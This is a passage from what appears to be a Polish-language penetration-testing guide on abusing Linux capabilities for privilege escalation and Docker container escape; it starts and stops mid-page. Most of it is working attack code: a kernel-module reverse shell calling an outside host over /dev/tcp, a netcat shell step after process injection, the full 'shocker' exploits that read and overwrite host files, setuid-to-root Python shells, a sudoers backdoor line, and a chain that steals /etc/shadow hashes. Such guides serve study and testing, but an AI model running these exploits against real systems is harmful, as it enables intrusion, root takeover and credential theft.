Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

Wyświetl **procesy** uruchomione na **hoście** `ps -eaf`

1. Sprawdź **architekturę** `uname -m`
2. Znajdź **shellcode** dla tej architektury ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Znajdź **program** do **inject**owania **shellcode** do pamięci procesu ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Zmodyfikuj** **shellcode** w programie i **skompiluj** go `gcc inject.c -o inject`
5. Wykonaj **inject** i uzyskaj **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** umożliwia procesowi **ładowanie i usuwanie modułów jądra (wywołania systemowe `init_module(2)`, `finit_module(2)` i `delete_module(2)`)**, zapewniając bezpośredni dostęp do podstawowych operacji jądra. Ta capability stwarza krytyczne zagrożenia dla bezpieczeństwa, ponieważ załadowanie modułu może zmienić działanie jądra i potencjalnie zniwelować granice izolacji.<sup>[[6]](#references)[[14]](#references)</sup>
W zwykłym kontenerze Linux działającym z uprawnieniami root jest to **współdzielone jądro hosta**, a zatem bezpośrednia droga ucieczki z kontenera. Capability musi być efektywna w początkowej przestrzeni nazw użytkowników, ponieważ ładowanie modułów nie jest izolowane przez przestrzenie nazw. Środowisko uruchomieniowe z jądrem w przestrzeni użytkownika lub izolacją przez maszynę wirtualną, takie jak gVisor, Kata lub Hyper-V, zmienia to, do której granicy jądra można uzyskać dostęp. Ładowanie modułów może być nadal zablokowane przez `modules_disabled`, kernel lockdown, wymuszanie podpisów, seccomp lub LSM.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym**

W poniższym przykładzie plik binarny **`python`** ma tę capability.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

Domyślnie polecenie **`modprobe`** sprawdza listę zależności i pliki map w katalogu **`/lib/modules/$(uname -r)`**.\
Aby to wykorzystać, utwórzmy fałszywy katalog **lib/modules**:

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

Następnie **skompiluj moduł jądra — poniżej znajdziesz 2 przykłady — i skopiuj** go do tego folderu:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

Na koniec wykonaj wymagany kod Pythona, aby załadować ten moduł jądra:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**Przykład 2 z plikiem binarnym**

W poniższym przykładzie plik binarny **`kmod`** ma to uprawnienie.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

Co oznacza, że można użyć polecenia **`insmod`**, aby załadować moduł jądra. Postępuj zgodnie z poniższym przykładem, aby uzyskać **reverse shell**, wykorzystując to uprawnienie.

**Przykład ze środowiskiem (Docker breakout)**

Możesz sprawdzić włączone capabilities w kontenerze Docker za pomocą:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

W poprzednim wyniku widać, że capability **SYS_MODULE** jest włączone.<sup>[[14]](#references)</sup>

**Utwórz** **moduł jądra**, który uruchomi reverse shell, oraz **Makefile**, aby go **skompilować**:

```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> [!WARNING]
> Pusty znak przed każdym słowem `make` w pliku Makefile **musi być tabulatorem, a nie spacjami**!

Uruchom `make`, aby skompilować program.

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

Na koniec uruchom nc w jednej powłoce i **załaduj moduł** z innej, a przechwycisz powłokę w procesie nc:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**Kod tej techniki skopiowano z laboratorium „Abusing SYS_MODULE Capability” z** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Inny przykład tej techniki można znaleźć pod adresem [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) pozwala procesowi **omijać uprawnienia wymagane do odczytu plików oraz odczytu i wykonywania katalogów**. Umożliwia również użycie `open_by_handle_at(2)`, które interpretuje prawidłowy uchwyt pliku względem deskryptora pliku montowania tego samego zamontowanego systemu plików. Nie udostępnia automatycznie wszystkich plików poza przestrzenią nazw montowań procesu. Ucieczka z użyciem uchwytu pliku wymaga dodatkowo odwołania do systemu plików dostępnego z hosta, prawidłowych lub możliwych do odnalezienia uchwytów, zgodnego systemu plików i układu danych, a także braku blokady ze strony środowiska uruchomieniowego lub LSM. Historyczna technika Docker „Shocker” pokazała takie połączenie w podatnych konfiguracjach, co opisano [tutaj](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**Oznacza to, że możesz omijać kontrole uprawnień do odczytu plików oraz odczytu i wykonywania katalogów**.<sup>[[14]](#references)</sup>

W przypadku **niestandardowego pliku wykonywalnego** z tą capability sprawdź, co odczytuje i zwraca wywołującemu. Narzędzie do skanowania plików, które przyjmuje podaną przez wywołującego ścieżkę do chronionego pliku oraz długość prefiksu, a następnie ujawnia pełny digest tego prefiksu, może działać jak wyrocznia odczytu pliku: po odzyskaniu pierwszych `n-1` bajtów porównuj digesty kandydatów dla każdego możliwego kolejnego bajtu z digestem zwróconym przez narzędzie dla długości `n`. Nie wymaga to znalezienia kolizji kryptograficznej ani użycia konkretnie MD5; opiera się na powtarzanych zapytaniach z wybraną długością i widocznych, deterministycznych digestach. Digest całego pliku bez możliwości określenia prefiksu nie pozwala na to samo. Potwierdź, że wywołujący może uruchomić narzędzie, jego file capability staje się aktywna, podana ścieżka jest dostępna w jego przestrzeni nazw montowań, a zachowanie wejścia/wyjścia faktycznie odpowiada opisowi. Nie uruchamiaj nieznanego uprzywilejowanego narzędzia tylko po to, by sprawdzić to podczas pasywnej enumeracji.

**Przykład z plikiem binarnym**

Plik binarny może odczytywać pliki dostępne w jego przestrzeniach nazw. Jeśli więc plik taki jak `tar` ma tę capability, może odczytać plik shadow:

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**Przykład z binary2**

W tym przypadku załóżmy, że plik binarny **`python`** ma tę capability. Aby wyświetlić pliki roota, możesz użyć:

```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```

Aby odczytać plik, można wykonać:

```python
print(open("/etc/shadow", "r").read())
```

**Przykład w środowisku (Docker breakout)**

Możesz sprawdzić włączone capabilities w kontenerze Docker za pomocą `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

W poprzednim wyniku widać, że włączono capability **DAC_READ_SEARCH**. Omija ona kontrole DAC przy odczycie i wyszukiwaniu oraz umożliwia użycie `open_by_handle_at(2)`; sama w sobie nie jest capability do debugowania procesów.<sup>[[14]](#references)</sup>

Jak działa poniższy exploit, możesz przeczytać na stronie [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3). W skrócie: **CAP_DAC_READ_SEARCH** pozwala przemieszczać się po systemie plików bez kontroli uprawnień i umożliwia użycie `open_by_handle_at(2)`; może to ujawnić pliki otwarte przez inne procesy, jeśli dostępne są odpowiednie namespaces i mounty.<sup>[[13]](#references)[[14]](#references)</sup>

Oryginalny exploit wykorzystujący te uprawnienia do odczytu plików z hosta znajdziesz tutaj: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); poniżej znajduje się **zmodyfikowana wersja, która przyjmuje plik do odczytu jako pierwszy argument i zapisuje wynik do pliku**.<sup>[[12]](#references)</sup>

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };

    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

    read(0, buf, 1);

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");

    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    printf("Success!!\n");

    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);

    close(fd2); close(fd1);

    return 0;
}
```

> [!WARNING]
> Exploit musi znaleźć wskaźnik do czegoś zamontowanego na hoście. Oryginalny exploit używał pliku `/.dockerinit`, a ta zmodyfikowana wersja używa `/etc/hostname`. Jeśli exploit nie działa, być może trzeba wskazać inny plik. Aby znaleźć plik zamontowany na hoście, wykonaj polecenie `mount`:

![CAP SYS MODULE - CAP DAC READ SEARCH: Exploit musi znaleźć wskaźnik do czegoś zamontowanego na hoście. Oryginalny exploit używał pliku /.dockerinit, a ta zmodyfikowana wersja używa...](<../../images/image (407) (1).png>)

**Kod tej techniki został skopiowany z laboratorium „Abusing DAC_READ_SEARCH Capability” z** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Ta capability omija kontrole uprawnień odczytu i zapisu plików oraz większość kontroli wykonania**; wykonanie zwykłego pliku nadal wymaga ustawienia co najmniej jednego bitu wykonania. Nie omija montowania tylko do odczytu, stanu immutable ani odmowy dostępu przez LSM.<sup>[[14]](#references)</sup>

Szukaj plików, które stają się możliwe do odczytu lub zapisu dzięki członkostwu w uprzywilejowanej grupie; przydatne cele zależą od właściciela pliku i jego bitów trybu dostępu.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym**

W tym przykładzie vim ma tę capability, więc możesz modyfikować dowolny plik, na przykład _passwd_, _sudoers_ lub _shadow_:

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**Przykład z plikiem binarnym 2**

W tym przykładzie plik binarny **`python`** będzie miał tę capability. Możesz użyć pythona, aby nadpisać dowolny plik:

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**Przykład ze środowiskiem + CAP_DAC_READ_SEARCH (Docker breakout)**

`CAP_DAC_READ_SEARCH` pozwala używać `open_by_handle_at(2)`, ale **nie** omija kontroli uprawnień do zapisu. Zapis za pomocą rozwiązanego uchwytu wymaga dodatkowo uprawnień do zapisu dla efektywnego identyfikatora użytkownika/grupy systemu plików procesu lub ACL albo `CAP_DAC_OVERRIDE`. Operacja wymaga również odpowiedniego odwołania do systemu plików hosta, obsługiwanych uchwytów plików, montowania z możliwością zapisu oraz zezwalającej na nią polityki środowiska uruchomieniowego/LSM. Sprawdź efektywne capabilities i tożsamość; żadna z tych capabilities sama w sobie nie potwierdza, że cel na hoście umożliwia zapis. Zobacz [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) i [open_by_handle_at(2)](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html).<sup>[[14]](#references)[[26]](#references)</sup>

Najpierw przeczytaj poprzednią sekcję, która [**wykorzystuje capability DAC_READ_SEARCH do odczytu dowolnych plików**](linux-capabilities.md#cap_dac_read_search) hosta, i **skompiluj** exploit.\
Poniższy historyczny przykład próbuje otworzyć rozwiązany plik z `O_RDWR`; powiedzie się to tylko wtedy, gdy spełnione są wcześniejsze warunki dotyczące systemu plików i uprawnień do zapisu:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```

Aby **uciec** z kontenera Docker, możesz **pobrać** z hosta pliki `/etc/shadow` i `/etc/passwd`, **dodać** do nich **nowego użytkownika**, a następnie użyć **`shocker_write`**, aby je nadpisać. Następnie **uzyskaj dostęp** przez **ssh**.

**Kod tej techniki skopiowano z laboratorium „Abusing DAC_OVERRIDE Capability” na stronie** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Ta capability pozwala procesowi zmieniać właściciela plików**.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym**

Załóżmy, że plik binarny **`python`** ma tę capability; możesz zmienić właściciela pliku takiego jak **`shadow`**, a następnie wykorzystać uzyskany dostęp do jego modyfikacji, jeśli pozwalają na to pozostałe uprawnienia:

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

Lub gdy plik binarny **`ruby`** ma to uprawnienie:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP_FOWNER

**Ta capability omija kontrole własności przy wielu operacjach na plikach, w tym przy zmianie uprawnień**.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym**

Jeśli python ma tę capability, możesz zmienić uprawnienia pliku shadow, **zmienić hasło roota** i eskalować uprawnienia:

```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```

### CAP_SETUID

**To uprawnienie pozwala procesowi zmienić efektywny identyfikator użytkownika, z uwzględnieniem reguł dotyczących poświadczeń i uprawnień egzekwowanych przez jądro**.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym**

Jeśli python ma to **uprawnienie**, możesz bardzo łatwo go nadużyć, aby eskalować uprawnienia do roota:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Inny sposób:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

W przypadku **niestandardowego** pliku wykonywalnego z efektywnym `CAP_SETUID` sprawdź osiągalną ścieżkę kodu, zamiast zakładać, że sama capability zapewnia dostęp do powłoki. Tekst kontrolowany przez wywołującego, przekazany jako *format string* do [`printf`](https://man7.org/linux/man-pages/man3/printf.3.html), może ujawnić lub zmienić pamięć procesu; użyteczna zmiana uprawnień nadal wymaga podatnego wywołania, kontrolowanego wejścia oraz późniejszego działania po `setuid(0)`. Jeśli to działanie uruchamia zewnętrzny program pomocniczy po nazwie, sprawdź efektywną tożsamość w chwili uruchomienia, faktyczną wartość `PATH` oraz to, czy wcześniejszy przeszukiwany katalog jest zapisywalny i dostępny dla wywołującego. Nieefektywna file capability, `no_new_privs`, stała zaufana ścieżka do programu pomocniczego albo nieosiągalna gałąź zmieniają wynik. Przeanalizuj plik binarny lub dostępny kod źródłowy offline; podczas rutynowego rozpoznania nie uruchamiaj podejrzanego programu pomocniczego z podwyższonymi uprawnieniami.

## CAP_SETGID

**Ta capability pozwala procesowi zmienić efektywny identyfikator grupy, z uwzględnieniem reguł dotyczących poświadczeń i capabilities egzekwowanych przez kernel**.<sup>[[14]](#references)</sup>

Istnieje wiele plików, które możesz **nadpisać, aby eskalować uprawnienia**; [**tutaj znajdziesz pomysły**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Przykład z plikiem binarnym**

W takim przypadku należy poszukać interesujących plików, które grupa może odczytać, ponieważ możesz podszyć się pod dowolną grupę:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Gdy znajdziesz plik, którego odczyt lub zapis możesz wykorzystać do eskalacji uprawnień, możesz **uruchomić shell z uprawnieniami interesującej cię grupy** za pomocą:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

W tym przypadku podszyto się pod grupę shadow, dzięki czemu można odczytać plik `/etc/shadow`:

```bash
cat /etc/shadow
```

### Połączony łańcuch: CAP_SETGID + CAP_CHOWN

Gdy obie capabilities są dostępne w tym samym helperze, praktyczny łańcuch wygląda następująco:

1. Zmień EGID na `shadow` (lub inną uprzywilejowaną grupę).
2. Użyj `chown` na `/etc/shadow`, aby ustawić swój UID, pozostawiając grupę `shadow`.
3. Odczytaj docelowy hash i złam go lub wykonaj pivot.

```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```

Pozwala to uniknąć bezpośredniego uzyskiwania pełnych uprawnień root i często wystarcza do pivotowania przez ponowne użycie poświadczeń.

Jeśli zainstalowany jest **docker**, możesz **podszyć się** pod grupę **docker** i nadużyć jej, aby komunikować się z [**docker socket** i eskalować uprawnienia](#writable-docker-socket).

## CAP_SETFCAP

**Ta capability pozwala procesowi ustawiać capabilities plików**.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym**

Jeśli python ma tę **capability**, możesz bardzo łatwo ją nadużyć, aby eskalować uprawnienia do root:

```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> Nowo zapisany zestaw capabilities pliku zastępuje poprzedni zestaw; jeśli następnie uruchomisz helpera tylko z nowymi capabilities, może on nie zachować `CAP_SETFCAP`, aby zaktualizować inny plik.<sup>[[14]](#references)[[25]](#references)</sup>

Gdy masz już [SETUID capability](linux-capabilities.md#cap_setuid), możesz przejść do tej sekcji, aby sprawdzić, jak eskalować uprawnienia.

**Przykład ze środowiskiem (Docker breakout)**

Domyślny zestaw capabilities Docker, zgodnie z dokumentacją, obejmuje **CAP_SETFCAP**, ale rzeczywisty zestaw zależy od konfiguracji runtime’u.<sup>[[19]](#references)</sup>
Możesz sprawdzić capabilities procesu za pomocą:

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

Ta capability umożliwia zapisywanie capabilities plików, ale sama w sobie nie nadaje ich bieżącemu procesowi ani nie omija reguł dotyczących pliku, bounding setu i przestrzeni nazw, stosowanych podczas wykonywania pliku.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

Dozwolone capabilities pliku są ograniczone przez zbiór ograniczający capabilities procesu, a bit efektywności pliku określa, czy dozwolony zbiór pliku zostanie dodany do zbioru efektywnego procesu. Dlatego dodanie capabilities do pliku nie sprawia automatycznie, że wszystkie żądane capabilities będą możliwe do użycia podczas wykonania.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

